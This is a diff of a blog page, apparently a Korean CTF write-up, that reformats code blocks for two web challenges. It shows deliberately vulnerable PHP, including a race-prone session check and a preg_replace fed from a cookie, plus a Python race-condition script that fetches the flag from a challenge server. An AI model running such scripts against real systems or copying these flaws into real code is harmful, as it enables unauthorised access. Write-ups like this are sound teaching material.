@@ -108,7 +108,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <body>
     
 
-<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
+<header id="l_header" class="l_header always shadow blur show"  >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -388,28 +388,217 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   
   
-  <h3 id="1-web-ezrc"><a href="#1-web-ezrc" class="headerlink" title="1. (web) ezrc"></a>1. (web) ezrc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> session_start(); <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        header(<span class="string">&#x27;Location: ./login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;a href=<span class="string">&quot;source.php&quot;</span>&gt;&lt;button&gt;source code&lt;/button&gt;&lt;br/&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = mysqli_query(<span class="variable">$con</span>, <span class="string">&quot;select pw from ezrc where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="variable">$idx</span> = mysqli_fetch_array(<span class="variable">$res</span>);</span><br><span class="line">    <span class="variable">$pw</span> = <span class="variable">$idx</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$print_query</span> = <span class="string">&quot;select chk from ezrc where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$hehe_query</span> = <span class="string">&quot;update ezrc set chk=&#x27;<span class="subst">$hehe</span>&#x27; where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$reset_query</span> = <span class="string">&quot;update ezrc set chk=&#x27;nope&#x27; where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=logout.php&gt;logout&lt;/a&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;your id is &quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/(tata|dada|zaza)+[a-z]&#123;3&#125;+coco?hehe/&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]) &amp;&amp; strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])&gt;<span class="number">30</span>)&#123;</span><br><span class="line">        <span class="variable">$res</span> = mysqli_query(<span class="variable">$con</span>, <span class="variable">$print_query</span>);</span><br><span class="line">        <span class="variable">$idx</span> = mysqli_fetch_array(<span class="variable">$res</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;your chk is &quot;</span>.<span class="variable">$idx</span>[<span class="string">&#x27;chk&#x27;</span>].<span class="string">&quot;&lt;br/&gt;&quot;</span>;        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$idx</span>[<span class="string">&#x27;chk&#x27;</span>] == <span class="variable">$hehe</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">            mysqli_query(<span class="variable">$con</span>, <span class="variable">$reset_query</span>);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;congratulations&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    mysqli_query(<span class="variable">$con</span>, <span class="variable">$hehe_query</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;trust_is_very_cooool&quot;</span>;</span><br><span class="line">    <span class="variable">$t</span> = (<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;times&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pw</span> == md5(<span class="number">240610708</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;pw right&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$t</span>; <span class="variable">$i</span>=<span class="variable">$i</span>+<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span>&lt;<span class="variable">$t</span>; <span class="variable">$j</span>=<span class="variable">$j</span>+<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="variable">$str</span> = md5(<span class="variable">$str</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$str</span> == <span class="string">&quot;d91a2796ab967c9793ef1c628a91fac5&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            mysqli_query(<span class="variable">$con</span>, <span class="variable">$reset_query</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        mysqli_query(<span class="variable">$con</span>, <span class="variable">$reset_query</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+  <h3 id="1-web-ezrc"><a href="#1-web-ezrc" class="headerlink" title="1. (web) ezrc"></a>1. (web) ezrc</h3><pre><code class="php">&lt;?php session_start(); include &#39;config.php&#39;; ?&gt;
+&lt;?php
+    if(!isset($_SESSION[&#39;id&#39;]))&#123;
+        header(&#39;Location: ./login.html&#39;);
+        exit;
+    &#125;
+?&gt;
+&lt;a href=&quot;source.php&quot;&gt;&lt;button&gt;source code&lt;/button&gt;&lt;br/&gt;&lt;/a&gt;
+
+&lt;?php 
+$id = $_SESSION[&#39;id&#39;];
+    $res = mysqli_query($con, &quot;select pw from ezrc where id=&#39;$id&#39;&quot;);
+    $idx = mysqli_fetch_array($res);
+    $pw = $idx[&#39;pw&#39;];
+
+    $print_query = &quot;select chk from ezrc where id=&#39;$id&#39;&quot;;
+    $hehe_query = &quot;update ezrc set chk=&#39;$hehe&#39; where id=&#39;$id&#39;&quot;;
+    $reset_query = &quot;update ezrc set chk=&#39;nope&#39; where id=&#39;$id&#39;&quot;;
+
+    echo &quot;&lt;a href=logout.php&gt;logout&lt;/a&gt;&lt;br/&gt;&quot;;
+    echo &quot;your id is &quot;.$id.&quot;&lt;br/&gt;&quot;;
+    if(preg_match(&quot;/(tata|dada|zaza)+[a-z]&#123;3&#125;+coco?hehe/&quot;, $_GET[&#39;key&#39;]) &amp;&amp; strlen($_GET[&#39;key&#39;])&gt;30)&#123;
+        $res = mysqli_query($con, $print_query);
+        $idx = mysqli_fetch_array($res);
+        echo &quot;your chk is &quot;.$idx[&#39;chk&#39;].&quot;&lt;br/&gt;&quot;;        
+        if($idx[&#39;chk&#39;] == $hehe)&#123;
+            echo $flag.&quot;&lt;br/&gt;&quot;;
+            mysqli_query($con, $reset_query);
+            exit(&quot;congratulations&quot;);
+        &#125;
+    &#125;
+    mysqli_query($con, $hehe_query);
+    $str = &quot;trust_is_very_cooool&quot;;
+    $t = (int)$_GET[&#39;times&#39;];
+    if($pw == md5(240610708))&#123;
+        echo &quot;pw right&quot;;
+        for($i=0; $i&lt;$t; $i=$i+1)&#123;
+            for($j=0; $j&lt;$t; $j=$j+1)&#123;
+                $str = md5($str);
+            &#125;
+        &#125;
+        if($str == &quot;d91a2796ab967c9793ef1c628a91fac5&quot;)&#123;
+            echo $flag;
+        &#125;
+        else&#123;
+            mysqli_query($con, $reset_query);
+        &#125;
+    &#125;
+    else&#123;
+        mysqli_query($con, $reset_query);
+    &#125;
+?&gt;</code></pre>
 <p>레이스 컨디션(race condition) 을 이용하는 문제이다.</p>
 <p>서로 다른 브라우저(세션) 을 가지고 동시에 요청하면 다른 한 브라우저에서 플래그를 넘겨준다.</p>
 <p>CTF에서 레이스 컨디션을 사용한 문제를 본 것이 조금 신기하다. (잘 못보던 케이스)</p>
 <p>암튼 파이썬으로 코딩해서 문제를 풀어주면 된다.</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">cookie1 = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;bb11&#x27;</span>&#125;</span><br><span class="line">cookie2 = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;bb22&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">cookie</span>):</span></span><br><span class="line">    url = <span class="string">&quot;http://198.13.32.181:4345/login_check.php&quot;</span></span><br><span class="line">    param = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;bb&#x27;</span>,<span class="string">&#x27;pw&#x27;</span>:<span class="string">&#x27;bb&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(url, data=param, cookies=cookie)</span><br><span class="line">    <span class="built_in">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">times</span>():</span></span><br><span class="line">    <span class="keyword">global</span> cookie1;</span><br><span class="line">    url = <span class="string">&quot;http://198.13.32.181:4345/index.php?times=111111111111111111111111111111&quot;</span></span><br><span class="line">    r = requests.get(url, cookies=cookie1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">global</span> cookie2;</span><br><span class="line">    url = <span class="string">&quot;http://198.13.32.181:4345/index.php?key=tatadadazazaabccocoheheaaaaaaaaaaaaa&quot;</span></span><br><span class="line">    r = requests.get(url, cookies=cookie2)</span><br><span class="line">    <span class="built_in">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    login(cookie1)</span><br><span class="line">    login(cookie2)</span><br><span class="line">    t1 = threading.Thread(target=times,args=())</span><br><span class="line">    t2 = threading.Thread(target=flag,args=())</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<pre><code class="py">import requests
+import threading
+
+cookie1 = &#123;&#39;PHPSESSID&#39;:&#39;bb11&#39;&#125;
+cookie2 = &#123;&#39;PHPSESSID&#39;:&#39;bb22&#39;&#125;
+
+def login(cookie):
+    url = &quot;http://198.13.32.181:4345/login_check.php&quot;
+    param = &#123;&#39;id&#39;:&#39;bb&#39;,&#39;pw&#39;:&#39;bb&#39;&#125;
+    r = requests.post(url, data=param, cookies=cookie)
+    print r.text
+
+def times():
+    global cookie1;
+    url = &quot;http://198.13.32.181:4345/index.php?times=111111111111111111111111111111&quot;
+    r = requests.get(url, cookies=cookie1)
+
+def flag():
+    global cookie2;
+    url = &quot;http://198.13.32.181:4345/index.php?key=tatadadazazaabccocoheheaaaaaaaaaaaaa&quot;
+    r = requests.get(url, cookies=cookie2)
+    print r.text
+
+def main():
+    login(cookie1)
+    login(cookie2)
+    t1 = threading.Thread(target=times,args=())
+    t2 = threading.Thread(target=flag,args=())
+    t1.start()
+    t2.start()
+main()</code></pre>
 <p><code> Thank you (NGA) </code></p>
 <hr>
-<h3 id="2-web-jpg-viewer"><a href="#2-web-jpg-viewer" class="headerlink" title="2. (web) jpg viewer"></a>2. (web) jpg viewer</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  session_start();</span><br><span class="line">  <span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/jwt.php&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;PHPSESSJWT&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$jwt</span>-&gt;hashing(<span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&#x27;admin&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&#x27;iat&#x27;</span> =&gt; time(),</span><br><span class="line">    ));</span><br><span class="line">    setcookie(<span class="string">&#x27;PHPSESSJWT&#x27;</span>, <span class="variable">$token</span>, time() + <span class="number">86400</span> * <span class="number">30</span>);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/jwt.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;PHPSESSJWT&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$token</span>) &#123;</span><br><span class="line">        <span class="variable">$body</span> = <span class="variable">$jwt</span>-&gt;dehashing(<span class="variable">$token</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">      <span class="keyword">echo</span> highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">      <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">imageanalyze</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;Where is the File?&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(!exif_read_data(<span class="variable">$file</span>))&#123;</span><br><span class="line">            unlink(<span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> exif_read_data(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;JPG&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;JPG&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;JPG&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$upload_directory</span> = <span class="string">&#x27;./uploads/&#x27;</span>;</span><br><span class="line">        <span class="variable">$ext_str</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$max_file_size</span> = <span class="number">5242880</span>;</span><br><span class="line">        <span class="variable">$ext</span> = explode(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$ext</span> = strtolower(array_pop(<span class="variable">$ext</span>));</span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$ext</span>, <span class="variable">$ext_str</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;jpg파일만 업로드 할 수 있습니다.&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt;= <span class="variable">$max_file_size</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;파일은 5MB 까지만 업로드 가능합니다.&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$path</span> = <span class="variable">$upload_directory</span>.session_id();</span><br><span class="line">        <span class="variable">$updir</span> = <span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        mkdir(<span class="variable">$path</span>,<span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$updir</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;파일 업로드 성공!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;<span class="subst">$updir</span>&#x27;&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$infor</span> = imageanalyze(<span class="variable">$updir</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;업로드 에러!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$infor</span>))&#123;</span><br><span class="line">    <span class="variable">$Date</span> = <span class="variable">$infor</span>[<span class="string">&#x27;DateTimeOriginal&#x27;</span>];</span><br><span class="line">    <span class="variable">$Model</span> = <span class="variable">$infor</span>[<span class="string">&#x27;Model&#x27;</span>];</span><br><span class="line">    <span class="variable">$Make</span> = <span class="variable">$infor</span>[<span class="string">&#x27;Make&#x27;</span>];</span><br><span class="line">    <span class="variable">$size</span> = round(<span class="variable">$infor</span>[<span class="string">&#x27;FileSize&#x27;</span>]/<span class="number">1024</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;파일명 : <span class="subst">&#123;$infor[&#x27;FileName&#x27;]&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;파일 크기 : <span class="subst">&#123;$size&#125;</span>KB&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(array_key_exists(<span class="string">&#x27;DateTimeOriginal&#x27;</span>,<span class="variable">$infor</span>))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;촬영 시간 : <span class="subst">&#123;$Date&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$date</span> = date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, <span class="variable">$infor</span>[<span class="string">&#x27;FileDateTime&#x27;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;업로드 시간 : <span class="subst">&#123;$date&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(array_key_exists(<span class="string">&#x27;Model&#x27;</span>,<span class="variable">$infor</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$infor</span>[<span class="string">&#x27;Model&#x27;</span>]))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;카메라 모델 : <span class="subst">&#123;$Model&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$body</span>[<span class="string">&#x27;admin&#x27;</span>]==<span class="literal">true</span>)&#123;</span><br><span class="line">      <span class="variable">$edit</span> = explode(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$_COOKIE</span>[<span class="string">&#x27;edit&#x27;</span>]);</span><br><span class="line">      preg_replace(<span class="variable">$$edit</span>[<span class="number">0</span>],<span class="variable">$$edit</span>[<span class="number">1</span>],<span class="variable">$$edit</span>[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-web-jpg-viewer"><a href="#2-web-jpg-viewer" class="headerlink" title="2. (web) jpg viewer"></a>2. (web) jpg viewer</h3><pre><code class="php">&lt;?php
+  session_start();
+  require_once __DIR__ . &#39;/jwt.php&#39;;
+  if(!isset($_COOKIE[&#39;PHPSESSJWT&#39;]))&#123;
+    $token = $jwt-&gt;hashing(array(
+      &#39;admin&#39; =&gt; false,
+      &#39;iat&#39; =&gt; time(),
+    ));
+    setcookie(&#39;PHPSESSJWT&#39;, $token, time() + 86400 * 30);
+   &#125;
+?&gt;
+  &lt;?php
+
+    require_once __DIR__ . &#39;/jwt.php&#39;;
+    $token = $_COOKIE[&#39;PHPSESSJWT&#39;];
+    if ($token) &#123;
+        $body = $jwt-&gt;dehashing($token);
+    &#125;
+    if(isset($_GET[&#39;source&#39;]))&#123;
+      echo highlight_file(__FILE__);
+      exit;
+    &#125;
+
+    function imageanalyze($file)&#123;
+        if(!is_file($file))&#123;
+            echo &#39;&lt;script&gt;alert(&quot;Where is the File?&quot;)&lt;/script&gt;&#39;;
+            exit;
+        &#125;
+        elseif(!exif_read_data($file))&#123;
+            unlink($file);
+            exit;
+        &#125;
+        else&#123;
+            return exif_read_data($file);
+        &#125;
+    &#125;
+
+    if(isset($_FILES[&#39;JPG&#39;]) &amp;&amp; $_FILES[&#39;JPG&#39;][&#39;name&#39;] != &quot;&quot;) &#123;
+        $file = $_FILES[&#39;JPG&#39;];
+
+        $upload_directory = &#39;./uploads/&#39;;
+        $ext_str = array(&quot;jpg&quot;);
+
+        $max_file_size = 5242880;
+        $ext = explode(&#39;.&#39;,$file[&#39;name&#39;]);
+        $ext = strtolower(array_pop($ext));
+        if(!in_array($ext, $ext_str)) &#123;
+            echo &quot;&lt;script&gt;alert(&#39;jpg파일만 업로드 할 수 있습니다.&#39;)&lt;/script&gt;&quot;;
+            exit;
+        &#125;
+
+        if($file[&#39;size&#39;] &gt;= $max_file_size) &#123;
+            echo &quot;&lt;script&gt;alert(&#39;파일은 5MB 까지만 업로드 가능합니다.&#39;)&lt;/script&gt;&quot;;
+            exit;
+        &#125;
+
+        $path = $upload_directory.session_id();
+        $updir = $path.&#39;/&#39;.$file[&#39;name&#39;];
+        mkdir($path,0777);
+        if(move_uploaded_file($file[&#39;tmp_name&#39;],$updir)) &#123;
+            echo &quot;&lt;script&gt;alert(&#39;파일 업로드 성공!&#39;)&lt;/script&gt;&quot;;
+            echo &quot;&lt;img src=&#39;$updir&#39;&gt;&quot;;
+            $infor = imageanalyze($updir);
+        &#125;
+        else&#123;
+            echo &quot;&lt;script&gt;alert(&#39;업로드 에러!&#39;)&lt;/script&gt;&quot;;
+            exit;
+        &#125;
+        &#125;
+    ?&gt;
+  &lt;?php
+    if(isset($infor))&#123;
+    $Date = $infor[&#39;DateTimeOriginal&#39;];
+    $Model = $infor[&#39;Model&#39;];
+    $Make = $infor[&#39;Make&#39;];
+    $size = round($infor[&#39;FileSize&#39;]/1024,1);
+    echo &quot;&lt;br&gt;파일명 : &#123;$infor[&#39;FileName&#39;]&#125;&lt;br&gt;&quot;;
+    echo &quot;파일 크기 : &#123;$size&#125;KB&lt;br&gt;&quot;;
+    if(array_key_exists(&#39;DateTimeOriginal&#39;,$infor))&#123;
+       echo &quot;촬영 시간 : &#123;$Date&#125;&lt;br&gt;&quot;;
+    &#125;
+    else&#123;
+      $date = date(&quot;Y-m-d H:i:s&quot;, $infor[&#39;FileDateTime&#39;]);
+      echo &quot;업로드 시간 : &#123;$date&#125;&lt;br&gt;&quot;;
+    &#125;
+    if(array_key_exists(&#39;Model&#39;,$infor)&amp;&amp;isset($infor[&#39;Model&#39;]))&#123;
+      echo &quot;카메라 모델 : &#123;$Model&#125;&lt;br&gt;&quot;;
+      &#125;
+    &#125;
+    if($body[&#39;admin&#39;]==true)&#123;
+      $edit = explode(&#39;.&#39;,$_COOKIE[&#39;edit&#39;]);
+      preg_replace($$edit[0],$$edit[1],$$edit[2]);
+    &#125;
+  ?&gt;</code></pre>
 <p>이번에도 코드가 좀 길다, 한번 분석해보자.</p>
